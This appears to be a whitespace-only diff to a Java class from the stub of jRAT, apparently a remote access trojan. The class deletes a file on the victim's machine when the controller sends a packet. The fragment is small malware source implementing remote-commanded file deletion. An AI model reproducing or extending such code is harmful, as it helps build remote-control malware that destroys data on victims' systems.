@@ -4,8 +4,6 @@ import java.io.File;
 
 import pro.jrat.stub.Connection;
 
-
-
 public class Packet16DeleteFile extends AbstractIncomingPacket {
 
 	@Override
@@ -15,7 +13,7 @@ public class Packet16DeleteFile extends AbstractIncomingPacket {
 		if (f.exists()) {
 			f.delete();
 		}
-		
+
 	}
 
 }
